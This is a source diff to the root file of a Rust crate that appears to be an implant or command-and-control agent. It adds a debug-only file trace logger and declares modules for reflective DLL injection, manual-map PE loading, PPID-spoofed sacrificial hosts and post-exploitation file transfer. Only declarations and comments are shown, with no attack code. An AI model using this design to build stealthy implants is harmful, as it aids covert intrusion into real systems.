@@ -17,13 +17,51 @@ macro_rules! dbg_print {
     };
 }
 
+/// Diagnostics breadcrumb — **debug builds only**, then env-gated (`AGENT_TRACE_FILE`).
+/// Product release: compile-time no-op (no path / brand / format residue).
+#[cfg(debug_assertions)]
+pub fn tracef_g(msg: &str) {
+    let p = match std::env::var("AGENT_TRACE_FILE") {
+        Ok(p) if !p.is_empty() => p,
+        _ => return,
+    };
+    use std::io::Write;
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis())
+        .unwrap_or(0);
+    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&p) {
+        let _ = writeln!(f, "[{}] {}", ts, msg);
+    }
+}
+
+#[cfg(not(debug_assertions))]
+#[inline(always)]
+pub fn tracef_g(_msg: &str) {}
+
+/// Release-safe trace macro: argument expressions are not compiled in release.
+#[macro_export]
+macro_rules! tracef {
+    ($($arg:tt)*) => {{
+        #[cfg(debug_assertions)]
+        {
+            $crate::tracef_g(&::std::format!($($arg)*));
+        }
+    }};
+}
+
 pub mod backoff;
 pub mod config;
 #[cfg(feature = "ws")]
 pub mod connection;
 pub mod crypto;
 pub mod error;
+// handler/transport need the tokio stack — pulled by `net` (transports + agent).
+// L2 module crates (features=["bof"]) build without `net`, keeping tokio's
+// thread_locals out of the mapped module image (pe_map refuses TLS dirs).
+#[cfg(feature = "net")]
 pub mod handler;
+#[cfg(feature = "net")]
 pub mod transport;
 pub mod types;
 pub mod wire_ids;
@@ -75,13 +113,18 @@ pub mod module_package;
 /// Stage0 never LoadLibrary/Manual-Map product modules — see docs/MODULE_WORKER_ISOLATION.md.
 #[cfg(feature = "module-loader")]
 pub mod module_supervisor;
+/// Reflective DLL injection — zero-disk worker loading (inject/ad modules).
+#[cfg(feature = "module-loader")]
+pub mod img_load;
+/// Worker I/O ABI (job/result pipe handles) shared with inject/ad workers.
+pub mod worker_io;
 /// Stage0-local AD artifact wipe (path-prefix safe; no worker).
 #[cfg(feature = "module-loader")]
 pub mod ad_artifact;
 /// Manual-Map PE loader for L2 modules (no temp DLL).
 /// Product whitelist modules must not use this path (supervisor only).
 #[cfg(all(windows, feature = "mem-map"))]
-pub mod pe_map;
+pub mod pe_img;
 
 // PPID-spoofed sacrificial host for BOF/.NET
 #[cfg(feature = "isolated-exec")]
@@ -107,7 +150,9 @@ pub use error::{ClientError, Result};
 pub use executor::CommandExecutor;
 #[cfg(feature = "post-ex")]
 pub use fs::{download, ls, upload, FileInfo};
+#[cfg(feature = "net")]
 pub use handler::MessageHandler;
+#[cfg(feature = "net")]
 pub use transport::{create_transport, Transport};
 pub use types::{
     CommandPayload, CommandResult, MessageType, MessageWrapper, RegisterPayload, ResponsePayload,
